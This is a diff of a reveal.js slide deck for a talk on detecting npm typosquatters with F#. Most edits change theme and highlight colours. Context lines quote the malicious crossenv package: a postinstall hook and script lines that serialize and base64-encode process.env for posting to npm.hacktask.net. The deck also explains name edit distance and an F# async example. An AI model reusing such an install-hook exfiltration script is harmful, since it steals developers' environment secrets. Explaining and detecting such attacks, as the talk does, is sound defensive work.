@@ -8,7 +8,7 @@
 	<title>Hunting typosquatters with F#</title>
 
 	<link rel="stylesheet" href="talk/reveal.js/css/reveal.css">
-	<link rel="stylesheet" href="talk/reveal.js/css/theme/black.css">
+	<link rel="stylesheet" href="talk/reveal.js/css/theme/sky.css">
 
 	<!-- Theme used for syntax highlighting of code -->
 	<link rel="stylesheet" href="talk/reveal.js/lib/css/zenburn.css">
@@ -29,7 +29,6 @@
 	<div class="reveal">
 		<div class="slides">
 			<script src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
-
 			<section>
 				<h2>Hunting typosquatters
 					<br/>with F#</h2>
@@ -123,16 +122,16 @@ var talk = {
 				<section>
 					<h4>npm - package.json</h4>
 					<pre class="center"><code  data-noescape> {
-  <span class="fragment highlight-current-green">"name": "my-great-package",
+  <span class="fragment highlight-current-red">"name": "my-great-package",
   "version": "1.0.0",</span>
-  <span class="fragment highlight-current-green">"description": "makes code great again",
+  <span class="fragment highlight-current-red">"description": "makes code great again",
   "license": "MIT",
   "author": "chester",</span>
-  <span class="fragment highlight-current-green">"dependencies": {
+  <span class="fragment highlight-current-red">"dependencies": {
     "dependency1": "1.2.3",
     "dependency2": "2.3.4"
   },</span>
-  <span class="fragment highlight-current-green">"scripts": {
+  <span class="fragment highlight-current-red">"scripts": {
     "install": "make &amp;&amp; make install",
     "postinstall": "post-install.js"
   }</span>
@@ -170,18 +169,18 @@ var talk = {
 				<section>
 					<p>crossenv - package.json</p>
 					<pre><code  data-noescape>{
-  <span class="fragment highlight-current-green" data-fragment-index="1" >"name": "crossenv"</span>,
+  <span class="fragment highlight-current-red" data-fragment-index="1" >"name": "crossenv"</span>,
   "version": "6.1.1",
   "description": "Run scripts that set and use environment variables across platforms",
   "main": "index.js",
   "scripts": {
     "test": "echo \"Error: no test specified\" ",
-    <span class="fragment highlight-current-green" data-fragment-index="2" >"postinstall": "node package-setup.js"</span>
+    <span class="fragment highlight-current-red" data-fragment-index="2" >"postinstall": "node package-setup.js"</span>
   },
   "author": "Kent C. Dodds",
   "license": "ISC",
   "dependencies": {
-    <span class="fragment highlight-current-green" data-fragment-index="1" >"cross-env": "^5.0.1"</span>
+    <span class="fragment highlight-current-red" data-fragment-index="1" >"cross-env": "^5.0.1"</span>
   }
 }</code></pre>
 				</section>
@@ -189,8 +188,8 @@ var talk = {
 					<p>crossenv - package-setup.js</p>
 					<pre><code data-noescape>const http = require('http');
 const querystring = require('querystring');
-<span class="fragment highlight-current-green" >const env = JSON.stringify(process.env);</span>
-<span class="fragment highlight-current-green" >const data = new Buffer(env).toString('base64');
+<span class="fragment highlight-current-red" >const env = JSON.stringify(process.env);</span>
+<span class="fragment highlight-current-red" >const data = new Buffer(env).toString('base64');
 const postData = querystring.stringify({ data });
 const options = {
 	hostname: 'npm.hacktask.net',
@@ -286,35 +285,35 @@ req.end();</span>
 					<p>measure of the similarity between two strings, it is the number of deletions, insertions, or substitutions required
 						to transform one string into another</p>
 					<p>
-						<label>te<span class="fragment highlight-current-green" data-fragment-index="1">s</span>t -> te<span class="fragment highlight-current-green" data-fragment-index="1">n</span>t = <span class="fragment highlight-current-green" data-fragment-index="1">1 substitution</span></label>
+						<label>te<span class="fragment highlight-current-red" data-fragment-index="1">s</span>t -> te<span class="fragment highlight-current-red" data-fragment-index="1">n</span>t = <span class="fragment highlight-current-red" data-fragment-index="1">1 substitution</span></label>
 					</p>
 					<p>
-						<label><span class="fragment highlight-current-green" data-fragment-index="2">t</span>e<span class="fragment highlight-current-green" data-fragment-index="2">s</span>t -> <span class="fragment highlight-current-green" data-fragment-index="2">r</span>e<span class="fragment highlight-current-green" data-fragment-index="2">n</span>t = <span class="fragment highlight-current-green" data-fragment-index="2">2 substitutions</span></label>
+						<label><span class="fragment highlight-current-red" data-fragment-index="2">t</span>e<span class="fragment highlight-current-red" data-fragment-index="2">s</span>t -> <span class="fragment highlight-current-red" data-fragment-index="2">r</span>e<span class="fragment highlight-current-red" data-fragment-index="2">n</span>t = <span class="fragment highlight-current-red" data-fragment-index="2">2 substitutions</span></label>
 					</p>
 					<p>
-						<label> test -> test<span class="fragment highlight-current-green" data-fragment-index="3">s</span> = <span class="fragment highlight-current-green" data-fragment-index="3">1 insertion</span></label>
+						<label> test -> test<span class="fragment highlight-current-red" data-fragment-index="3">s</span> = <span class="fragment highlight-current-red" data-fragment-index="3">1 insertion</span></label>
 					</p>
 					<p>
-						<label>test -> test<span class="fragment highlight-current-green" data-fragment-index="4">ed</span> = <span class="fragment highlight-current-green" data-fragment-index="4">2 insertions</span></label>
+						<label>test -> test<span class="fragment highlight-current-red" data-fragment-index="4">ed</span> = <span class="fragment highlight-current-red" data-fragment-index="4">2 insertions</span></label>
 					</p>
 				</section>
 
 				<section>
 					<h4>hacktask packages</h4>
 					<p>
-						<label>crossenv -> cross<span class="fragment highlight-current-green" data-fragment-index="1">-</span>env - dist = 1</label>
+						<label>crossenv -> cross<span class="fragment highlight-current-red" data-fragment-index="1">-</span>env - dist = 1</label>
 					</p>
 					<p>
-						<label>babelcli -> babel<span class="fragment highlight-current-green" data-fragment-index="1">-</span>cli - dist = 1</label>
+						<label>babelcli -> babel<span class="fragment highlight-current-red" data-fragment-index="1">-</span>cli - dist = 1</label>
 					</p>
 					<p>
-						<label>ffm<span class="fragment highlight-current-green" data-fragment-index="1">ep</span>g -> ffm<span class="fragment highlight-current-green" data-fragment-index="1">pe</span>g - dist = 2</label>
+						<label>ffm<span class="fragment highlight-current-red" data-fragment-index="1">ep</span>g -> ffm<span class="fragment highlight-current-red" data-fragment-index="1">pe</span>g - dist = 2</label>
 					</p>
 					<p>
-						<label>mysql<span class="fragment highlight-current-green" data-fragment-index="1">js</span> -> mysql - dist = 2</label>
+						<label>mysql<span class="fragment highlight-current-red" data-fragment-index="1">js</span> -> mysql - dist = 2</label>
 					</p>
 					<p>
-						<label>d3<span class="fragment highlight-current-green" data-fragment-index="1">.js</span> -> d3 - dist = 3</label>
+						<label>d3<span class="fragment highlight-current-red" data-fragment-index="1">.js</span> -> d3 - dist = 3</label>
 					</p>
 				</section>
 
@@ -334,9 +333,9 @@ req.end();</span>
 				<p>npmjs.com data stored in CouchDB database</p>
 				<p>key-value store, value is JSON object:</p>
 				<pre class="center"><code  data-noescape>{
-  <span class="fragment highlight-current-green">"name": "d3fc"</span>,
+  <span class="fragment highlight-current-red">"name": "d3fc"</span>,
   "maintainers": [ 
-    <span class="fragment highlight-current-green">{ "name": "chrisprice" }, 
+    <span class="fragment highlight-current-red">{ "name": "chrisprice" }, 
     { "name": "colineberhardt" }</span>
   ],
   "versions": {
@@ -419,30 +418,30 @@ req.end();</span>
 					<p>Async&lt;'a&gt; similar concept to TPL's Task&lt;T&gt;</p>
 				</section>
 
-<section>
-				<pre class="center"><code class="fs"data-noescape>open System.Net
+				<section>
+					<pre class="center"><code class="fs"data-noescape>open System.Net
 // string -> Async&lt;string option&gt;
-let <span class="fragment highlight-current-green" data-fragment-index="1">fetchAsync</span> <span class="fragment highlight-current-green" data-fragment-index="2">url</span> = <span class="fragment highlight-current-green" data-fragment-index="3">async {</span>
+let <span class="fragment highlight-current-red" data-fragment-index="1">fetchAsync</span> <span class="fragment highlight-current-red" data-fragment-index="2">url</span> = <span class="fragment highlight-current-red" data-fragment-index="3">async {</span>
     try
       let uri = new System.Uri(url)
       let webClient = new WebClient()
-      <span class="fragment highlight-current-green" data-fragment-index="4">let! html = webClient.AsyncDownloadString(uri)</span>
-      <span class="fragment highlight-current-green" data-fragment-index="5">return Some html</span>
+      <span class="fragment highlight-current-red" data-fragment-index="4">let! html = webClient.AsyncDownloadString(uri)</span>
+      <span class="fragment highlight-current-red" data-fragment-index="5">return Some html</span>
     with
-	<span class="fragment highlight-current-green" data-fragment-index="6">| ex -> return None</span>
-    <span class="fragment highlight-current-green" data-fragment-index="3">}</span>
-<span class="fragment highlight-current-green" data-fragment-index="7">let urlList = [ "http://www.microsoft.com/"; 
+	<span class="fragment highlight-current-red" data-fragment-index="6">| ex -> return None</span>
+    <span class="fragment highlight-current-red" data-fragment-index="3">}</span>
+<span class="fragment highlight-current-red" data-fragment-index="7">let urlList = [ "http://www.microsoft.com/"; 
     "http://msdn.microsoft.com/"]</span>
 let results = 
         urlList                   // string list
-        |> <span class="fragment highlight-current-green" data-fragment-index="8">List.map fetchAsync</span>    // Async&lt;string option&gt; list
-        |> <span class="fragment highlight-current-green" data-fragment-index="9">Async.Parallel         // Async&lt;string option []&gt;
+        |> <span class="fragment highlight-current-red" data-fragment-index="8">List.map fetchAsync</span>    // Async&lt;string option&gt; list
+        |> <span class="fragment highlight-current-red" data-fragment-index="9">Async.Parallel         // Async&lt;string option []&gt;
         |> Async.RunSynchronously</span> // string option []
-<span class="fragment highlight-current-green" data-fragment-index="10">for result in results do
+<span class="fragment highlight-current-red" data-fragment-index="10">for result in results do
   match result with
   | Some html -> printfn "%s" html
   | None      -> printfn "Failed :("</span></code></pre>
-			</section>
+				</section>
 
 				<!-- <section>
 					<img src="talk/img/AsyncDownloadExample.png" width="100%" />
@@ -554,7 +553,7 @@ TwitterBootstrap, vbasic, verisign, visualbasic, youcanttouchme</pre>
 						<i>Just import it and all your problems will go away! </i>
 					</p>
 					<img src="talk/img/PackageIGithub.png" width="70%" />
-					<img src="talk/img/PackageIRunkit.png" width="70%" />
+					<img class="fragment" src="talk/img/PackageIRunkit.png" width="70%" />
 
 				</section>
 
